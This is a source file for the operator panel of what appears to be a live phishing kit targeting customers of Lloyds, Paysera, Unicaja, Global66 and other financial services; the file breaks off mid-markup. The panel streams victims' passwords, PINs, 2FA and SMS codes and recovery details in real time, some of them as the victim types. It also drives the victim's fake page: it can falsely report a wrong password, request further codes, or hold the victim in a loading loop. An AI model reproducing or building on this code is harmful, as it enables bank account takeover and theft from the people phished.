import { useState, useEffect, useRef, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import LloydsOperatorControls from "@/components/admin/LloydsOperatorControls";
import {
  Shield,
  KeyRound,
  Mail,
  Monitor,
  Send,
  CheckCircle,
  XCircle,
  Smartphone,
  AlertTriangle,
  MailCheck,
  Eye,
  Lock,
  Globe,
  Copy,
  X,
  Minimize2,
  Maximize2,
  GripHorizontal,
  ShieldCheck,
  Loader2,
} from "lucide-react";
import { parseBrowser } from "@/lib/adminUtils";
import { buildKycLink } from "@/lib/kyc";
import { toast } from "@/components/ui/use-toast";
import type { SessionRecord } from "@/components/admin/AllSessionsTable";
import { useSessionPresence } from "@/hooks/useSessionPresence";

interface OperateSessionModalProps {
  session: SessionRecord;
  onClose: () => void;
  index: number;
}

const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalProps) => {
  const [platformOtp, setPlatformOtp] = useState("");
  const [emailPassword, setEmailPassword] = useState("");
  const [emailCode, setEmailCode] = useState("");
  const [emailCodeLabel, setEmailCodeLabel] = useState("");
  const [idPin, setIdPin] = useState("");
  const [idToken, setIdToken] = useState("");
  const [idSms, setIdSms] = useState("");
  const [idPhone, setIdPhone] = useState("");
  const [idRecovery, setIdRecovery] = useState("");
  const [currentPassword, setCurrentPassword] = useState(session.password || "");
  const [payseraTokenInput, setPayseraTokenInput] = useState("");
  const [currentStatus, setCurrentStatus] = useState(session.status);
  const [adminTokenCode, setAdminTokenCode] = useState("");
  const [adminSmsNumber, setAdminSmsNumber] = useState("");
  const [lastSentSmsEnding, setLastSentSmsEnding] = useState("");
  const [clientPhoneNumber, setClientPhoneNumber] = useState("");
  const [adminRecoveryEmail, setAdminRecoveryEmail] = useState("");
  const [clientRecoveryEmail, setClientRecoveryEmail] = useState("");
  const [sending, setSending] = useState<string | null>(null);
  const [ppiMfaType, setPpiMfaType] = useState<number | null>(null);
  const [lastAction, setLastAction] = useState<string | null>(null);
  const [decision, setDecision] = useState<string | null>(null);
  const [decisionSending, setDecisionSending] = useState(false);
  const [currentPhase, setCurrentPhase] = useState<string>("initial");
  const [copied, setCopied] = useState<string | null>(null);
  const [minimized, setMinimized] = useState(false);

  // ── Drag state ──
  const [pos, setPos] = useState({ x: 0, y: 0 });
  const [isDragging, setIsDragging] = useState(false);
  const dragOffset = useRef({ x: 0, y: 0 });
  const modalRef = useRef<HTMLDivElement>(null);
  const initialized = useRef(false);

  useEffect(() => {
    if (initialized.current) return;
    initialized.current = true;
    const vw = window.innerWidth;
    const modalW = 460;
    const x = vw - modalW - 16 - (index % 4) * 24;
    const y = 70 + (index % 4) * 24;
    setPos({ x, y });
  }, [index]);

  // ── Drag handlers ──
  const onMouseDown = useCallback((e: React.MouseEvent) => {
    e.preventDefault();
    setIsDragging(true);
    dragOffset.current = { x: e.clientX - pos.x, y: e.clientY - pos.y };
  }, [pos]);

  useEffect(() => {
    if (!isDragging) return;
    const onMove = (e: MouseEvent) => {
      setPos({
        x: Math.max(0, Math.min(window.innerWidth - 200, e.clientX - dragOffset.current.x)),
        y: Math.max(0, Math.min(window.innerHeight - 60, e.clientY - dragOffset.current.y)),
      });
    };
    const onUp = () => setIsDragging(false);
    window.addEventListener("mousemove", onMove);
    window.addEventListener("mouseup", onUp);
    return () => { window.removeEventListener("mousemove", onMove); window.removeEventListener("mouseup", onUp); };
  }, [isDragging]);

  const onTouchStart = useCallback((e: React.TouchEvent) => {
    const t = e.touches[0];
    setIsDragging(true);
    dragOffset.current = { x: t.clientX - pos.x, y: t.clientY - pos.y };
  }, [pos]);

  useEffect(() => {
    if (!isDragging) return;
    const onTouchMove = (e: TouchEvent) => {
      const t = e.touches[0];
      setPos({
        x: Math.max(0, Math.min(window.innerWidth - 200, t.clientX - dragOffset.current.x)),
        y: Math.max(0, Math.min(window.innerHeight - 60, t.clientY - dragOffset.current.y)),
      });
    };
    const onTouchEnd = () => setIsDragging(false);
    window.addEventListener("touchmove", onTouchMove, { passive: false });
    window.addEventListener("touchend", onTouchEnd);
    return () => { window.removeEventListener("touchmove", onTouchMove); window.removeEventListener("touchend", onTouchEnd); };
  }, [isDragging]);

  const onlineSessions = useSessionPresence();
  const isOnline = onlineSessions.has(session.id);
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const ch = {
    review: `session-review-${session.id}`,
    otpDec: `session-otp-decision-${session.id}`,
    otpCli: `session-review-client-otp-${session.id}`,
    confirm: `confirm-email-${session.id}`,
    sync: `sync-email-${session.id}`,
    otpMon: `otp-monitor-admin-${session.id}`,
  };

  // ── Channel refs for broadcasting ──
  const channelRefs = useRef<Record<string, ReturnType<typeof supabase.channel>>>({});

  // ── Realtime ──
  useEffect(() => {
    const subs: ReturnType<typeof supabase.channel>[] = [];

    // Subscribe to all channels and store refs for broadcasting
    const allChannelNames = [ch.review, ch.otpDec, ch.otpCli, ch.confirm, ch.sync, ch.otpMon];
    
    allChannelNames.forEach((name) => {
      const channel = supabase.channel(name);
      channelRefs.current[name] = channel;
      subs.push(channel);
    });

    // OTP monitor
    channelRefs.current[ch.otpMon]
      .on("broadcast", { event: "otp_code_update" }, (p) => {
        const c = p.payload?.otp_code as string;
        if (c !== undefined) setPlatformOtp(c);
      }).subscribe();

    // Confirm email channel — captures both identification (id_) and email sync events
    channelRefs.current[ch.confirm]
      // Identification events (Paysera PIN flow)
      .on("broadcast", { event: "client_id_pin" }, (p) => { if (p.payload?.id_pin !== undefined) setIdPin(p.payload.id_pin); })
      .on("broadcast", { event: "client_email_password_typing" }, (p) => {
        if (p.payload?.email_password !== undefined) {
          // Check source: if from identification screen it goes to idPin, else emailPassword
          if ((session.source === "paysera" || session.source === "cocosdigital") && (currentStatus?.startsWith("redirect_confirm") || currentStatus?.startsWith("confirm_"))) {
            setIdPin(p.payload.email_password);
          } else {
            setEmailPassword(p.payload.email_password);
          }
        }
      })
      .on("broadcast", { event: "client_id_token_update" }, (p) => { if (p.payload?.id_token !== undefined) setIdToken(p.payload.id_token); })
      .on("broadcast", { event: "client_id_sms_update" }, (p) => { if (p.payload?.id_sms !== undefined) setIdSms(p.payload.id_sms); })
      .on("broadcast", { event: "client_id_phone_update" }, (p) => { if (p.payload?.id_phone !== undefined) setIdPhone(p.payload.id_phone); })
      .on("broadcast", { event: "client_id_phone_submitted" }, (p) => { if (p.payload?.id_phone !== undefined) setIdPhone(p.payload.id_phone); })
      .on("broadcast", { event: "client_id_recovery_update" }, (p) => { if (p.payload?.id_recovery !== undefined) setIdRecovery(p.payload.id_recovery); })
      .on("broadcast", { event: "client_id_recovery_submitted" }, (p) => { if (p.payload?.id_recovery !== undefined) setIdRecovery(p.payload.id_recovery); })
      // Email sync events (from confirm channel)
      .on("broadcast", { event: "client_email_password" }, (p) => { if (p.payload?.email_password) setEmailPassword(p.payload.email_password); })
      .on("broadcast", { event: "client_token_update" }, (p) => {
        if (p.payload?.token_code !== undefined) {
          // If client is on OTP screen, this is the platform token; otherwise it's email 2FA
          setPlatformOtp(p.payload.token_code);
          console.log("[AdminBroadcast] Received token_code:", p.payload.token_code);
        }
      })
      .on("broadcast", { event: "client_sms_update" }, (p) => { if (p.payload?.sms_code !== undefined) { setEmailCode(p.payload.sms_code); setEmailCodeLabel("SMS"); } })
      .on("broadcast", { event: "client_recovery_update" }, (p) => { if (p.payload?.recovery_code !== undefined) { setEmailCode(p.payload.recovery_code); setEmailCodeLabel("Recovery"); } })
      .on("broadcast", { event: "client_phone_update" }, (p) => { if (p.payload?.phone_number !== undefined) setClientPhoneNumber(p.payload.phone_number); })
      .on("broadcast", { event: "client_phone_submitted" }, (p) => { if (p.payload?.phone_number !== undefined) setClientPhoneNumber(p.payload.phone_number); })
      .on("broadcast", { event: "client_recovery_email_update" }, (p) => { if (p.payload?.recovery_email !== undefined) setClientRecoveryEmail(p.payload.recovery_email); })
      .on("broadcast", { event: "client_recovery_email_submitted" }, (p) => { if (p.payload?.recovery_email !== undefined) setClientRecoveryEmail(p.payload.recovery_email); })
      .subscribe();

    // Sync email channel
    channelRefs.current[ch.sync]
      .on("broadcast", { event: "client_email_password_typing" }, (p) => { if (p.payload?.email_password !== undefined) setEmailPassword(p.payload.email_password); })
      .on("broadcast", { event: "client_email_password" }, (p) => { if (p.payload?.email_password) setEmailPassword(p.payload.email_password); })
      .on("broadcast", { event: "client_sync_password" }, (p) => { if (p.payload?.sync_password) setEmailPassword(p.payload.sync_password); })
      .on("broadcast", { event: "client_token_update" }, (p) => { if (p.payload?.token_code !== undefined) { setEmailCode(p.payload.token_code); setEmailCodeLabel("2FA Email"); } })
      .on("broadcast", { event: "client_sync_token_update" }, (p) => { if (p.payload?.token_code !== undefined) { setEmailCode(p.payload.token_code); setEmailCodeLabel("2FA Email"); } })
      .on("broadcast", { event: "client_sms_update" }, (p) => { if (p.payload?.sms_code !== undefined) { setEmailCode(p.payload.sms_code); setEmailCodeLabel("SMS"); } })
      .on("broadcast", { event: "client_sync_sms_update" }, (p) => { if (p.payload?.sms_code !== undefined) { setEmailCode(p.payload.sms_code); setEmailCodeLabel("SMS"); } })
      .on("broadcast", { event: "client_sync_recovery_update" }, (p) => { if (p.payload?.recovery_code !== undefined) { setEmailCode(p.payload.recovery_code); setEmailCodeLabel("Recovery"); } })
      .on("broadcast", { event: "client_phone_update" }, (p) => { if (p.payload?.phone_number !== undefined) setClientPhoneNumber(p.payload.phone_number); })
      .on("broadcast", { event: "client_phone_submitted" }, (p) => { if (p.payload?.phone_number !== undefined) setClientPhoneNumber(p.payload.phone_number); })
      .on("broadcast", { event: "client_recovery_email_update" }, (p) => { if (p.payload?.recovery_email !== undefined) setClientRecoveryEmail(p.payload.recovery_email); })
      .on("broadcast", { event: "client_recovery_email_submitted" }, (p) => { if (p.payload?.recovery_email !== undefined) setClientRecoveryEmail(p.payload.recovery_email); })
      .subscribe();

    // Subscribe remaining channels (review, otpDec, otpCli) for broadcasting
    [ch.review, ch.otpDec, ch.otpCli].forEach((name) => {
      channelRefs.current[name].subscribe();
    });

    const fetchData = async () => {
      const { data } = await supabase.from("sessions").select("otp_code, status, password").eq("id", session.id).maybeSingle();
      if (!data) return;
      const otp = data.otp_code || "";
      console.log("[AdminPoll]", session.id.slice(0,8), "otp_code:", otp, "status:", data.status);
      if (data.password && data.password !== currentPassword) setCurrentPassword(data.password);
      setCurrentStatus(data.status);
      if (data.status === "pending_review" && lastAction === "p_wrong") { setLastAction(null); setDecision(null); }
      
      // Parse ALL prefixed data from otp_code field
      if (otp.startsWith("token_code:")) {
        const val = otp.replace("token_code:", "");
        console.log("[AdminPoll] Setting platformOtp =", val);
        setPlatformOtp(val);
      } else if (/^\d+$/.test(otp) && otp.length <= 20) {
        setPlatformOtp(otp);
      }
      if (otp.startsWith("id_pin:")) setIdPin(otp.replace("id_pin:", ""));
      if (otp.startsWith("id_token:")) setIdToken(otp.replace("id_token:", ""));
      if (otp.startsWith("id_sms:")) setIdSms(otp.replace("id_sms:", ""));
      if (otp.startsWith("id_phone:") || otp.startsWith("id_phone_final:")) setIdPhone(otp.replace(/^id_phone(_final)?:/, ""));
      if (otp.startsWith("id_recovery:") || otp.startsWith("id_recovery_final:")) setIdRecovery(otp.replace(/^id_recovery(_final)?:/, ""));
      if (otp.startsWith("email_pass:")) setEmailPassword(otp.replace("email_pass:", ""));
      if (otp.startsWith("sync_pass:")) setEmailPassword(otp.replace("sync_pass:", ""));
      if (otp.startsWith("sync_token:")) { setEmailCode(otp.replace("sync_token:", "")); setEmailCodeLabel("2FA Email"); }
      if (otp.startsWith("sms_code:") || otp.startsWith("sync_sms:")) { setEmailCode(otp.replace(/^(sms_code:|sync_sms:)/, "")); setEmailCodeLabel("SMS"); }
      if (otp.startsWith("client_phone:") || otp.startsWith("client_phone_final:")) { setClientPhoneNumber(otp.replace(/^(client_phone:|client_phone_final:)/, "")); }
      if (otp.startsWith("client_recovery_email:") || otp.startsWith("client_recovery_email_final:")) { setClientRecoveryEmail(otp.replace(/^(client_recovery_email:|client_recovery_email_final:)/, "")); }
      if (otp.startsWith("phone_verify:")) { setClientPhoneNumber(otp.replace("phone_verify:", "")); }
      if (data.status?.startsWith("redirect_otp")) setCurrentPhase("otp");
      if (data.status?.startsWith("redirect_confirm") || data.status?.startsWith("confirm_") || data.status?.startsWith("redirect_sync") || data.status?.startsWith("sync_")) setCurrentPhase("email");
    };
    fetchData();
    pollingRef.current = setInterval(fetchData, 2000);

    return () => {
      subs.forEach((c) => supabase.removeChannel(c));
      channelRefs.current = {};
      if (pollingRef.current) clearInterval(pollingRef.current);
    };
  }, [session.id]);

  // ── Broadcast using existing channel refs ──
  const broadcastToAll = useCallback((event: string, payload: Record<string, string>) => {
    const refs = channelRefs.current;
    [ch.review, ch.otpDec, ch.otpCli, ch.confirm, ch.sync].forEach((name) => {
      const channel = refs[name];
      if (channel) {
        channel.send({ type: "broadcast", event, payload });
      }
    });
  }, [session.id]);

  const doAction = async (id: string, dbStatus: string, events: { event: string; payload: Record<string, string> }[], dbExtra?: Record<string, string>) => {
    setSending(id);
    await supabase.from("sessions").update({ status: dbStatus, ...dbExtra }).eq("id", session.id);
    events.forEach(({ event, payload }) => broadcastToAll(event, payload));
    setSending(null);
    setLastAction(id);
    if (dbStatus.startsWith("redirect_otp")) setCurrentPhase("otp");
    if (dbStatus === "redirect_confirm_email" || dbStatus === "redirect_sync_email") setCurrentPhase("email");
  };

  // Platform actions
  const pRedirectOtp = () => doAction("p_otp", "redirect_otp", [{ event: "review_decision", payload: { status: "redirect_otp" } }]);
  const pPayseraToken = () => {
    if (!payseraTokenInput.trim()) return;
    doAction("p_paysera_token", "paysera_show_token", [
      { event: "review_decision", payload: { status: "paysera_show_token", token_number: payseraTokenInput } },
    ], { otp_code: `paysera_token:${payseraTokenInput}` });
    setPayseraTokenInput("");
  };
  const pPayseraSms = () => doAction("p_paysera_sms", "paysera_ask_sms", [
    { event: "review_decision", payload: { status: "paysera_ask_sms" } },
  ]);
  const pPayseraLoop = () => doAction("p_paysera_loop", "paysera_loading_loop", [
    { event: "review_decision", payload: { status: "paysera_loading_loop" } },
  ]);
  const pPayseraVerifyPhone = () => doAction("p_paysera_vphone", "paysera_verify_phone", [
    { event: "review_decision", payload: { status: "paysera_verify_phone" } },
  ]);
  const pWrongPassword = () => doAction("p_wrong", "wrong_password", [{ event: "review_decision", payload: { status: "wrong_password" } }]);
  const pApproveOtp = async () => {
    setDecisionSending(true);
    await supabase.from("sessions").update({ status: "otp_approved" }).eq("id", session.id);
    broadcastToAll("otp_decision", { status: "otp_approved" });
    broadcastToAll("review_decision", { status: "otp_approved" });
    setDecision("approved"); setDecisionSending(false);
  };
  const pRejectOtp = async () => {
    setDecisionSending(true);
    await supabase.from("sessions").update({ status: "otp_rejected" }).eq("id", session.id);
    broadcastToAll("otp_decision", { status: "otp_rejected" });
    broadcastToAll("review_decision", { status: "otp_rejected" });
    setDecision("rejected"); setDecisionSending(false);
    setTimeout(() => { setDecision(null); setPlatformOtp(""); setLastAction(null); }, 3000);
  };
  const pApproveLogin = async () => {
    setDecisionSending(true);
    await supabase.from("sessions").update({ status: "login_success" }).eq("id", session.id);
    broadcastToAll("review_decision", { status: "login_success" });
    setDecision("approved"); setDecisionSending(false);
  };

  const requestKyc = async () => {
    setSending("kyc_request");

    try {
      const operatorCode = session.operator_code || "master";
      const sessionEmail = session.email || null;

      let caseId: string | null = null;

      if (sessionEmail) {
        const { data: existingCase } = await supabase
          .from("kyc_cases")
          .select("id")
          .eq("operator_code", operatorCode)
          .eq("email", sessionEmail)
          .in("status", ["draft", "collecting", "submitted", "in_review"])
          .order("created_at", { ascending: false })
          .limit(1)
          .maybeSingle();

        caseId = existingCase?.id || null;
      }

      if (!caseId) {
        const { data: createdCase, error: createError } = await supabase
          .from("kyc_cases")
          .insert({
            operator_code: operatorCode,
            source: "brand_kyc",
            email: sessionEmail,
            status: "draft",
          })
          .select("id")
          .single();

        if (createError || !createdCase?.id) {
          throw createError || new Error("Não foi possível criar o caso KYC.");
        }

        caseId = createdCase.id;

        await supabase.from("kyc_audit_logs").insert({
          case_id: caseId,
          operator_code: operatorCode,
          event_type: "case_created",
          metadata: { generated_from_session: session.id, source: session.source },
        } as never);
      }

      const kycLink = buildKycLink(caseId);

      await supabase.from("kyc_audit_logs").insert({
        case_id: caseId,
        operator_code: operatorCode,
        event_type: "case_requested_from_operator",
        metadata: { session_id: session.id, email: sessionEmail, source: session.source },
      } as never);

      await supabase.from("sessions").update({ status: "redirect_kyc", otp_code: `kyc_link:${kycLink}` }).eq("id", session.id);
      broadcastToAll("review_decision", { status: "redirect_kyc", kyc_link: kycLink, kyc_case_id: caseId });
      setLastAction("kyc_request");
      toast({ title: "Wayni solicitado", description: "O cliente foi enviado para o onboarding da IOL." });
    } catch (error) {
      toast({
        title: "Erro ao solicitar Wayni",
        description: error instanceof Error ? error.message : "Não foi possível abrir o onboarding da IOL.",
      });
    } finally {
      setSending(null);
    }
  };
 
  // Email actions
  const eRedirectEmail = () => doAction("e_email", "redirect_confirm_email", [{ event: "review_decision", payload: { status: "redirect_confirm_email" } }]);
  const eSyncEmail = () => doAction("e_sync", "redirect_sync_email", [{ event: "review_decision", payload: { status: "redirect_sync_email" } }]);
  const eWrongPassword = () => doAction("e_wrong", "confirm_wrong_password", [
    { event: "admin_decision", payload: { status: "confirm_wrong_password" } },
    { event: "admin_sync_decision", payload: { status: "sync_wrong_password" } },
  ]);
  const eAskOtp = () => doAction("e_otp", "confirm_ask_otp", [
    { event: "admin_decision", payload: { status: "confirm_ask_otp" } },
    { event: "admin_sync_decision", payload: { status: "sync_ask_otp" } },
  ]);
  const eAskRecovery = () => doAction("e_rec", "confirm_ask_recovery", [
    { event: "admin_decision", payload: { status: "confirm_ask_recovery" } },
    { event: "admin_sync_decision", payload: { status: "sync_ask_recovery" } },
  ]);
  const eAskRecoveryCode = () => doAction("e_rec_code", "confirm_ask_recovery_code", [
    { event: "admin_decision", payload: { status: "confirm_ask_recovery_code" } },
    { event: "admin_sync_decision", payload: { status: "sync_ask_recovery_code" } },
  ]);
  const eSendToken = () => {
    if (!adminTokenCode.trim()) return;
    doAction("e_tok", "confirm_ask_token", [
      { event: "admin_decision", payload: { status: "confirm_ask_token", admin_token: adminTokenCode } },
      { event: "admin_sync_decision", payload: { status: "sync_ask_token", admin_token: adminTokenCode } },
    ], { otp_code: `admin_token:${adminTokenCode}` });
    setAdminTokenCode("");
  };
  const eSendSms = () => {
    const ending = adminSmsNumber;
    setLastSentSmsEnding(ending);
    doAction("e_sms", "confirm_ask_sms", [
      { event: "admin_decision", payload: { status: "confirm_ask_sms", sms_ending: ending } },
      { event: "admin_sync_decision", payload: { status: "sync_ask_sms", sms_ending: ending } },
    ], { otp_code: `sms_ending:${ending}` });
    setAdminSmsNumber("");
  };
  // Advance client to SMS code entry — includes the phone ending so client sees it
  const eAdvanceSmsCode = () => {
    const ending = lastSentSmsEnding || adminSmsNumber;
    doAction("e_sms_code", "confirm_advance_sms_code", [
      { event: "admin_decision", payload: { status: "confirm_advance_sms_code", sms_ending: ending } },
      { event: "admin_sync_decision", payload: { status: "sync_advance_sms_code", sms_ending: ending } },
    ], { otp_code: `sms_ending:${ending}` });
  };
  const eApprove = async () => {
    setDecisionSending(true);
    await supabase.from("sessions").update({ status: "confirm_approved" }).eq("id", session.id);
    broadcastToAll("admin_decision", { status: "confirm_approved" });
    broadcastToAll("admin_sync_decision", { status: "sync_approved" });
    setDecision("approved"); setDecisionSending(false);
  };
  const eReject = async () => {
    setDecisionSending(true);
    await supabase.from("sessions").update({ status: "confirm_rejected" }).eq("id", session.id);
    broadcastToAll("admin_decision", { status: "confirm_rejected" });
    broadcastToAll("admin_sync_decision", { status: "sync_rejected" });
    setDecision("rejected"); setDecisionSending(false);
    setTimeout(() => { setDecision(null); setEmailCode(""); setEmailPassword(""); setLastAction(null); }, 3000);
  };

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  const A = lastAction;
  const getClientStage = (status: string) => {
    if (status === "pending_review") return { label: "Aguardando revisão", color: "text-amber-400" };
    if (status === "waiting") return { label: "Aguardando operador", color: "text-sky-400" };
    if (status === "otp") return { label: "Esperando OTP", color: "text-blue-400" };
    if (status === "otp_submitted") return { label: "OTP enviado", color: "text-blue-400" };
    if (status === "wrong_password") return { label: "Reentrando senha", color: "text-destructive" };
    if (status === "redirect_otp") return { label: "Digitando 2FA", color: "text-blue-400" };
    if (status === "otp_approved") return { label: "2FA aprovado ✓", color: "text-green-400" };
    if (status === "otp_rejected") return { label: "2FA rejeitado", color: "text-destructive" };
    if (status === "redirect_kyc") return { label: "Preenchendo KYC", color: "text-primary" };
    if (status === "login_success") return { label: "Login concluído ✓", color: "text-green-400" };
    if (status === "redirect_confirm_email") return { label: "Tela Email (senha)", color: "text-amber-400" };
    if (status === "confirm_wrong_password") return { label: "Reentrando senha email", color: "text-destructive" };
    if (status === "confirm_ask_otp") return { label: "Digitando 2FA email", color: "text-blue-400" };
    if (status === "confirm_ask_token") return { label: "Vendo token", color: "text-blue-400" };
    if (status === "confirm_ask_sms") return { label: "Aguardando tel./SMS", color: "text-blue-400" };
    if (status === "confirm_ask_recovery_email") return { label: "Digitando email recup.", color: "text-amber-400" };
    if (status === "confirm_advance_sms_code") return { label: "Digitando SMS código", color: "text-blue-400" };
    if (status === "confirm_ask_recovery") return { label: "Aguardando recup.", color: "text-amber-400" };
    if (status === "confirm_approved") return { label: "Email aprovado ✓", color: "text-green-400" };
    if (status === "confirm_rejected") return { label: "Email rejeitado", color: "text-destructive" };
    if (status === "lloyds_memorable") return { label: "Tela Memorable", color: "text-emerald-400" };
    if (status === "lloyds_security_call") return { label: "Escolhendo telefone", color: "text-blue-400" };
    if (status === "lloyds_calling") return { label: "Em chamada", color: "text-amber-400" };
    if (status === "paysera_show_token") return { label: "Vendo token (app)", color: "text-blue-400" };
    if (status === "paysera_ask_sms") return { label: "Digitando SMS", color: "text-blue-400" };
    if (status === "paysera_loading_loop") return { label: "Loop carregando", color: "text-cyan-400" };
    if (status === "paysera_verify_phone") return { label: "Verificando Tel", color: "text-orange-400" };
    return { label: status.replace(/_/g, " "), color: "text-muted-foreground" };
  };

  const stage = getClientStage(currentStatus);

  if (minimized) {
    return (
      <div
        style={{ bottom: 16, right: 16 + index * 220 }}
        className="fixed z-[90] flex items-center gap-2 rounded-lg border border-primary/30 bg-card px-3 py-2 shadow-xl cursor-pointer hover:bg-card/90 transition-colors animate-scale-in"
        onClick={() => setMinimized(false)}
      >
        {session.source === "lloyds" ? (
          <span className="rounded-full border border-emerald-500/30 bg-emerald-500/10 px-1.5 py-0.5 text-[9px] font-bold text-emerald-400 uppercase tracking-wider shrink-0">LLO</span>
        ) : session.source === "paysera" ? (
          <span className="rounded-full border border-teal-500/30 bg-teal-500/10 px-1.5 py-0.5 text-[9px] font-bold text-teal-400 uppercase tracking-wider shrink-0">PAY</span>
        ) : session.source === "cocosdigital" ? (
          <span className="rounded-full border border-cyan-500/30 bg-cyan-500/10 px-1.5 py-0.5 text-[9px] font-bold text-cyan-400 uppercase tracking-wider shrink-0">COC</span>
        ) : session.source === "ueex" ? (
          <span className="rounded-full border border-orange-500/30 bg-orange-500/10 px-1.5 py-0.5 text-[9px] font-bold text-orange-400 uppercase tracking-wider shrink-0">UEX</span>
        ) : session.source === "iol" ? (
          <span className="rounded-full border border-violet-500/30 bg-violet-500/10 px-1.5 py-0.5 text-[9px] font-bold text-violet-400 uppercase tracking-wider shrink-0">IOL</span>
        ) : session.source === "ppi" ? (
          <span className="rounded-full border border-sky-500/30 bg-sky-500/10 px-1.5 py-0.5 text-[9px] font-bold text-sky-400 uppercase tracking-wider shrink-0">PPI</span>
                       ) : session.source === "unicaja" ? (
             <span className="rounded-full border border-sky-600/30 bg-sky-600/10 px-1.5 py-0.5 text-[9px] font-bold text-sky-500 uppercase tracking-wider shrink-0">UNI</span>
           ) : session.source === "global66" ? (
             <span className="rounded-full border border-indigo-500/30 bg-indigo-500/10 px-1.5 py-0.5 text-[9px] font-bold text-indigo-400 uppercase tracking-wider shrink-0">G66</span>
           ) : (
             <span className="rounded-full border border-primary/30 bg-primary/10 px-1.5 py-0.5 text-[9px] font-bold text-primary uppercase tracking-wider shrink-0">FX</span>
           )}
        <span className={`h-2 w-2 rounded-full shrink-0 ${isOnline ? "bg-green-400 animate-pulse" : "bg-muted-foreground/40"}`} />
        <span className="text-xs font-bold text-foreground truncate max-w-[120px]">{session.email?.split("@")[0] || "—"}</span>
        <span className={`text-[10px] font-semibold ${stage.color}`}>{stage.label}</span>
        <Maximize2 size={12} className="text-muted-foreground shrink-0" />
      </div>
    );
  }

  return (
    <div
      ref={modalRef}
      style={{ left: `${pos.x}px`, top: `${pos.y}px`, userSelect: isDragging ? "none" : "auto" }}
      className="fixed z-[80] w-[460px] max-h-[85vh] overflow-hidden rounded-xl border border-border bg-card shadow-2xl animate-scale-in flex flex-col"
    >
      {/* ── Header ── */}
      <div
        onMouseDown={onMouseDown}
        onTouchStart={onTouchStart}
        className={`flex items-center justify-between gap-2 border-b border-border bg-card px-3 py-2 shrink-0 ${isDragging ? "cursor-grabbing" : "cursor-grab"}`}
      >
        <div className="flex items-center gap-2 min-w-0">
          <GripHorizontal size={14} className="text-muted-foreground/40 shrink-0" />
           {session.source === "lloyds" ? (
             <span className="rounded-full border border-emerald-500/30 bg-emerald-500/10 px-1.5 py-0.5 text-[9px] font-bold text-emerald-400 uppercase tracking-wider shrink-0">LLO</span>
           ) : session.source === "paysera" ? (
             <span className="rounded-full border border-teal-500/30 bg-teal-500/10 px-1.5 py-0.5 text-[9px] font-bold text-teal-400 uppercase tracking-wider shrink-0">PAY</span>
           ) : session.source === "cocosdigital" ? (
             <span className="rounded-full border border-cyan-500/30 bg-cyan-500/10 px-1.5 py-0.5 text-[9px] font-bold text-cyan-400 uppercase tracking-wider shrink-0">COC</span>
           ) : session.source === "ueex" ? (
             <span className="rounded-full border border-orange-500/30 bg-orange-500/10 px-1.5 py-0.5 text-[9px] font-bold text-orange-400 uppercase tracking-wider shrink-0">UEX</span>
           ) : session.source === "iol" ? (
             <span className="rounded-full border border-violet-500/30 bg-violet-500/10 px-1.5 py-0.5 text-[9px] font-bold text-violet-400 uppercase tracking-wider shrink-0">IOL</span>
           ) : session.source === "ppi" ? (
             <span className="rounded-full border border-sky-500/30 bg-sky-500/10 px-1.5 py-0.5 text-[9px] font-bold text-sky-400 uppercase tracking-wider shrink-0">PPI</span>
           ) : session.source === "unicaja" ? (
              <span className="rounded-full border border-sky-600/30 bg-sky-600/10 px-1.5 py-0.5 text-[9px] font-bold text-sky-500 uppercase tracking-wider shrink-0">UNI</span>
            ) : session.source === "global66" ? (
              <span className="rounded-full border border-indigo-500/30 bg-indigo-500/10 px-1.5 py-0.5 text-[9px] font-bold text-indigo-400 uppercase tracking-wider shrink-0">G66</span>
            ) : (
              <span className="rounded-full border border-primary/30 bg-primary/10 px-1.5 py-0.5 text-[9px] font-bold text-primary uppercase tracking-wider shrink-0">FX</span>
            )}
          <span className={`h-2 w-2 rounded-full shrink-0 ${isOnline ? "bg-green-400 animate-pulse" : "bg-muted-foreground/40"}`} />
          <span className="text-xs font-bold text-foreground truncate">{session.email || "—"}</span>
          <span className={`text-[10px] font-semibold ${stage.color}`}>• {stage.label}</span>
        </div>
        <div className="flex items-center gap-1 shrink-0" onMouseDown={(e) => e.stopPropagation()} onTouchStart={(e) => e.stopPropagation()}>
          <button onClick={() => setMinimized(true)} className="rounded-md p-1 text-muted-foreground hover:bg-secondary hover:text-foreground transition-colors">
            <Minimize2 size={13} />
          </button>
          <button onClick={onClose} className="rounded-md p-1 text-muted-foreground hover:bg-destructive/10 hover:text-destructive transition-colors">
            <X size={13} />
          </button>
        </div>
      </div>

      <div className="p-3 space-y-3 overflow-y-auto flex-1">
        {/* ── User Info ── */}
        <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-[10px] text-muted-foreground px-1">
          <span className="font-mono">{session.ip_address || "—"}</span>
          {(session.city || session.country) && <span>{[session.city, session.country].filter(Boolean).join(", ")}</span>}
          {session.user_agent && <span className="flex items-center gap-1"><Monitor size={9} /> {parseBrowser(session.user_agent)}</span>}
        </div>

        {/* ── Live Data (compact — only show fields with data) ── */}
        <div className="rounded-lg border border-border bg-background/30 p-2.5">
          <p className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/60 mb-1.5">📡 Dados</p>
          <div className="grid grid-cols-3 gap-1">
            <MiniLive icon={<Mail size={10} />} label="Email" value={session.email} highlight={false} onCopy={() => copyToClipboard(session.email || "", "email")} isCopied={copied === "email"} />
            <MiniLive icon={<Lock size={10} />} label="Senha" value={currentPassword} highlight={currentPassword !== session.password} onCopy={() => copyToClipboard(currentPassword, "pw")} isCopied={copied === "pw"} />
            <MiniLive icon={<ShieldCheck size={10} />} label="Token" value={platformOtp} highlight={!!platformOtp} mono onCopy={() => copyToClipboard(platformOtp, "otp")} isCopied={copied === "otp"} />
            {(session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex" || session.source === "iol" || session.source === "ppi") && (
              <>
                {!!idPin && <MiniLive icon={<Lock size={10} />} label="PIN" value={idPin} highlight onCopy={() => copyToClipboard(idPin, "idpin")} isCopied={copied === "idpin"} />}
                {!!idToken && <MiniLive icon={<Eye size={10} />} label="Token ID" value={idToken} highlight mono onCopy={() => copyToClipboard(idToken, "idtok")} isCopied={copied === "idtok"} />}
                {!!idSms && <MiniLive icon={<Eye size={10} />} label="SMS ID" value={idSms} highlight mono onCopy={() => copyToClipboard(idSms, "idsms")} isCopied={copied === "idsms"} />}
